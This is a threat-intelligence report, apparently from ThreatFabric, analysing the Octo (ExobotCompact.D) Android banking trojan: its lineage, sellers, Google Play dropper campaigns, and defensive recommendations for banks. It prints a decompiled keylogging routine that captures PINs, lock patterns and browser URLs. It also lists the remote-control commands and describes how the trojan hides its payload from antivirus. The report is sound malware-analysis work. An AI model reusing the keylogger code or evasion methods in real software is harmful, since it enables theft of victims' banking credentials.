Look out for Octo's tentacles! A new on-device fraud Android Banking
Trojan with a rich legacy

Intro
In mid-2021, a new Android banking malware strain was spotted in the wild. While some AV companies dubbed it
as a new family with the name “Coper”, ThreatFabric threat intelligence pointed towards it being a direct
descendant of the quite well-known malware family Exobot. First observsed in 2016, and based on the source
code of the banking Trojan Marcher, Exobot was maintained until 2018 targeting financial institutions with a variety
of campaigns focused on Turkey, France and Germany as well as Australia, Thailand and Japan. Subsequently, a
“lite” version of it was introduced, named ExobotCompact by its author, the threat actor known as “android” on
dark-web forums.
ThreatFabric analysts were able to establish a direct connection between ExobotCompact and this newly spotted
malware strain, that was dubbed as ExobotCompact.B on our MTI Portal. After some iterations of updates in
ExobotCompact, the latest variant was introduced in November 2021, referred to as ExobotCompact.D.

The latest activity of this malware family, and actors behind it, involves distribution through several malicious
applications on Google Play Store. These applications were installed more then 50k+ times and were targeting
financial organisations all over the world, both with broad and generic campaigns with large amount of targets, as
well as very narrow and focused campaigns throughout Europe.
On January 23, 2022, ThreatFabric analysts spotted a post on one of the darknet forums, in which a member was
looking for Octo Android botnet. Further analysis, as it will be shown in this blog, uncovered a direct connection
between Octo and ExobotCompact: in fact, ExobotCompact was updated with several features and rebranded to
Octo. This blog covers details of attribution made by ThreatFabric analysts and provides more details of Modus
Operandi of this Android banking Trojan.

On-device fraud is here
The major update made to ExobotCompact brought remote access capability, thus allowing the threat actors
behind the Trojan to perform on-device fraud (ODF). ODF is the most dangerous, risky, and inconspicuous type of
fraud, where transactions are initiated from the same device that the victim uses every day. In this case, anti-fraud
engines are challenged to identify the fraudulent activity with significantly smaller number of suspicious indicators
compared to other types of fraud performed through different channels.
2/26

In general, to get remote control over the device, cybercriminals need screen-streaming to see the contents of the
screen and some mechanism to execute actions on the device. To establish remote access to the infected device,
ExobotCompact.D relies on built-in services that are part of Android OS: MediaProjection for screen streaming
and AccessibilityService to perform actions remotely. Even though this solution cannot be deemed completely
reliable, it is a realistic way to have remote control over the device. Screen streaming with MediaProjection is based
on sending screenshots at high rate (1 per second), which gives operator close to live representation of what is
happening on remote device.
When ExobotCompact.D receives “start_vnc” command, it parses the configuration sent together with this
command:
Option

Description

STREAM_SCREEN

Enables screen streaming with MediaProjection

BLACK

Enables black screen overlay to hide remote actions from victim

SILENT

Disables all notifications (no interruption mode), sets screen brightness to 0

“BLACK” and “SILENT” options help to not raise suspicion in victims as all remote actions and events caused by
them will be hidden and performed invisibly. Besides screen streaming, ExobotCompact.D is able to read all the
contents of the screen, including elements’ ID, type, and location on the screen. Having this information, the actor is
able to re-create the layout of the screen on the C2 backend and have visibility on the internal structure of any app
installed on the device. This information is later used when interacting with the remote device to point the element
that should be interacted with (i.e., clicked).
Having this real-time visibility, including the internal layout of applications, the operator can send actions to be
executed on the device with the help of the “vnc_tasks” command. The supported actions are listed in the table
below:
VNC task

Description

3/26

VNC task

Description

click_at

Performs click at specified coordinates X, Y

gesture

Performs gesture

set_text

Sets specified text in specified element

long_click

Performs long click

action

Performs specified action

set_clip

Sets clipboard text to specified one

paste

Pastes data from clipboard

send_pattern

Performs gesture based on the specified pattern

scroll

Performs scroll up/down

We would like to point out that these set of actions that the Trojan is able to perform on victim’s behalf is sufficient
to implement (with certain updates made to source code of the Trojan) an Automated Transfer System (ATS). In
that case the operator does not have to manually interact with the remote device, but can simply send a sequence
of actions to execute. Its execution can lead to automatic initiation of fraudulent transactions and its authorization
without manual efforts from the operator, thus allowing fraud on significantly larger scale.

Octo is the new Exo
At the time when Octo Android botnet was first mentioned on forums, it was unclear what botnet this was, whether
it was some new malware family or just some well-known family rebranded.
On February 3, 2022, another member revealed the owner of Octo botnet, a member of the forum known as
“Architect”. Later in March Architect confirmed he/she is the owner and seller of Octo botnet:

4/26

Earlier post by Architect reveals his/her skills. A search by telegram contact reveals another nickname used by
“Architect” on another forum: “goodluck”.

On this forum, “goodluck” mentioned that he/she has private Trojan written from scratch on December 10:

While investigating Octo botnet, ThreatFabric analysts spotted certain similarities between ExobotCompact features
and skills of Octo botnet owner, “Architect”:

5/26

“Source code protection from reverse (with native wrapper in C++)” - as we will show in this blog,
ExobotCompact uses proprietary payload obfuscation implemented in native library that protects it from
reverse engineering.
“Publication in Google Play with 100% approve” – ExobotCompact was seen distributed by several droppers
uploaded to official Google Play store.
“Disable Google Protect” – one of the first actions that ExobotCompact makes upon the installation.
At this point ThreatFabric analysts made a hypothesis that Octo botnet is a rebranding of ExobotCompact, and
“Architect” is either a new owner of the source code or the same actor who was behind Exobot and
ExobotCompact.A.
To prove this hypothesis, ThreatFabric analysts examined the supported commands of ExobotCompact, its
capabilities and commands available on the administrator panel of Octo banking Trojan.

Here is a summary of our findings:
Both ExobotCompact and Octo have remote access capability, and it is called “VNC” in both cases.
Octo panel has six time-based configurations that configure delays before executing some action. This list
exact matches the same delays that ExobotCompact can receive from C2. Some of the configurations, like
“minimize_delay” or “get_device_admin_delay” are unique and we have not seen it in other malware except
ExobotCompact.
The commands available on the Octo panel are similar to commands supported by ExobotCompact and do
not contain any command that is not present in ExobotCompact code.
Thus, having these facts in mind, we conclude that ExobotCompact was rebranded to Octo Android banking Trojan
and is rented by its owner “Architect”, also known as “goodluck”. ThreatFabric tracks this variant as
ExobotCompact.D.

Other capabilities
As highlighted in previous section, ExobotCompact/Octo has several notable features that help it to stay under the
radar and perform on-device fraud (ODF). The full list of Octo capabilities is shown hereunder:

6/26

Proprietary payload extraction
Analyzing the current mobile threats landscape, it is hard to point out a malware family that does not use antidetection and anti-analysis techniques. However, most of threat actors use third-party services that provide
malicious payload protection (so-called “cryptors”), while ExobotCompact implements proprietary payload
protection developed by its author. ExobotCompact.D uses a native library to decrypt and load the malicious
payload, which makes it hard to analyze and detect.
Despite the fact that the idea of using native libraries for obfuscation is not new, the implementation is quite
unique and was only seen used by ExobotCompact. The author of ExobotCompact pays attention not only to
development of the new features, but also to improving the payload protection. First versions of native payload
obfuscation were rather straightforward: the “decryptor” code was not obfuscated itself, making easy to read and
analyze. In the latest versions of this native wrapper author took further step: native code obfuscation. Since a lot of
anti-virus solutions rely on signature-based detection, this obfuscation makes it harder for them to detect the
malicious activity as native code does not contain “suspicious” string signatures.
The following screenshots show strings in first versions of native wrapper compared to its latest versions:

7/26

The obfuscation trick used here is not new and widely used in desktop malware as well as in some Android banking
Trojans. Strings are created dynamically during the execution of the native code by concatenating it symbol by
symbol as seen in the following screenshot:

Such approach not only makes it difficult to detect the malicious payload but also complicates the analysis and
automated processing of such samples, hence showing the maturity of ExobotCompact/Octo author and his/her
familiarity with desktop malware obfuscation techniques.

Keylogger
8/26

Just like most modern mobile malware, ExobotCompact is not an exception and features keylogging capability in its
arsenal. This capability is powered by AccessibilityService abuse: applications which have this service enabled can
receive all system events (applications start, user input, content displayed on the screen, etc.). ExobotCompact
uses it to log every action that user makes on the infected device. ExobotCompact.D keylogging feature can
capture the following data, among others:
lock pattern/PIN used to unlock the device
URLs of websites opened in Google Chrome browser
Clicks, including the information about the element clicked
Input focus changed event
Text changed event The following code snippet shows keylogging procedure:
public void keylogging(AccessibilityEvent acsbEvent) {
String capturedData = AcsbHelper.gitPinPattern(this.ctx, this.getRootActiveWindow());
if(!capturedData.isEmpty()) {
String packageName = AcsbService.goto();
if(!packageName.isEmpty()) {
capturedData = "Package: " + packageName + "; " + capturedData;
}
if(packageName.equals("com.android.chrome")) {
AccessibilityNodeInfo v1_1 = AcsbHelper.break(this.getRootActiveWindow(), "url_bar");
if(v1_1 != null) {
capturedData = "URL: " + v1_1.getText().toString() + "; " + capturedData;
}
}
Misc.sendCapturedData(this.ctx, capturedData);
}
if(!SharedPrefs.getBool(this.ctx, "keylogger_enabled", Boolean.FALSE).booleanValue()) {
return;
}
int keylogger_delay = (int)SharedPrefs.getInt(this.ctx, "keylogger_delay", Integer.valueOf(0));
if(((long)SharedPrefs.getLong(this.ctx, "uptime", Long.valueOf(0L))) < ((long)keylogger_delay)) {
return;
}
String v6 = AcsbHelper.parseAcsbEvent(this.ctx, acsbEvent, AcsbService.goto());
Misc.writeToKeylog(this.ctx, v6);
}

Campaigns and actors
Being a rental banking Trojan, ExobotCompact.D is used by several threat actors, who maintain different
campaigns. Most of them use malicious landing pages to distribute ExobotCompact.D under the guise of some
software update. However, some of the actors use more inventive approach using dropper app in official Google
Play Store. In this section we will cover the most notable actors and campaigns.
Our threat intelligence shows that there are more then 5 different actors behind Octo, presumably including the
owner him-/herself, based on the different C2 URL paths we have seen used by it. Our investigation of darknet
forums also reveals several customers of “Architect” / ”goodluck”, more details are available on the full report
available to users of our Mobile Threat Intel service.

Fast Cleaner

10/26

In early February 2022 ThreatFabric analysts discovered a dropper on Google Play named “Fast Cleaner”, which
was in fact a sample of GymDrop dropper Trojan, also discovered by ThreatFabric in November 2021. This dropper
had 50.000+ installations and was seen distributing ExobotCompact.D as well as Alien.A and Xenomorph.A:

This campaign was active almost whole February 2022 and targeted mostly users of European banks from Spain,
Belgium, Portugal, Italy. The same actor used malicious landing pages to install ExobotCompact.D under the guise
of browser update:

Pocket Screencaster and Google Chrome
11/26

Shortly after Fast Cleaner campaign ended, ThreatFabric analysts discovered another GymDrop dropper on
Google Play posing as an application for screen recording. However, unlike previous campaign, this dropper was
only seen distributing ExobotCompact.D and no other malware families. Moreover, the dropper itself is allowed to
be installed only for users from UK, Poland, Spain, and Portugal. As we have pointed out previously, C2s and its
paths highly likely correlate with unique threat actors behind ExobotCompact.D. Based on this fact, the same actor
operates the ongoing campaign where the Trojan is posing as Google Chrome update. This fact explains great
number of overlay targets from almost all over the world: actor is using the same C2 to operate different
campaigns, global and focused on European users:

Financial apps
Another actor behind ExobotCompact.D seems to be highly focused on customers of several European banks and
is using their icons and application names to lure victims into installing the application. The specific focus is also
indicated by a rather short list of targeted applications to perform overlay attack. These applications belong to
financial organizations from Germany and Austria:

12/26

Play Store
Actor behind this campaign was first using a quite large target list that included around 70 applications, but at the
time of writing this report it is also highly focused on customers from specific country (Hungary) and is distributing
ExobotCompact.D under the guise of Play Store update through malicious websites:

Besides abovementioned threat actors there are several actors who use different masks to lure victims into
installing the application, thus launching, and testing different campaigns and different masks. These include
already mentioned updates for Google Chrome, financial apps, messengers (i.e., WhatsApp), etc.

13/26

Conclusions
ExobotCompact.D serves as a great example of modern mobile banking malware. Rebranding to Octo erases
previous ties to the Exobot source code leak, inviting multiple threat actors looking for opportunity to rent an
allegedly new and original Trojan. Its capabilities put at risk not only explicitly targeted applications that are targeted
by overlay attack, but any application installed on the infected device as ExobotCompact/Octo is able to read
content of any app displayed on the screen and provide the actor with sufficient information to remotely interact with
it and perform on-device fraud (ODF). Moreover, these includes all authenticator applications that display OTP
codes on the screen.
ExobotCompact/Octo has dangerous capabilities, powered by inventive distribution schemes including droppers on
official Google Play store and malicious landing pages. Thus, customers are very likely to fall into installing the
malware on their devices, allowing the actors to have remote access to their devices and therefore to their banking
accounts. To properly detect possible ODF we recommend financial institutions to have strong client-side detection
solution that can detect malware not only by signatures (ExobotCompact proves that it can be useless), but by its
malicious behavior.

MTI & CSD
Our Mobile Threat Intelligence (MTI) service provides financial institutions with a better visibility on the increasing
threat of mobile banking malware. Banks who are using MTI understand which malware campaigns are targeting
their mobile channel and how their mobile banking users are impacted.
With our Client Side Detection (CSD) service we are helping financial institutions to gain visibility on (potential)
fraud by mobile banking malware, and to prevent it. If you would like to know more about how we use our mobile
threat intelligence to detect mobile banking malware on mobile devices, feel free to reach out to
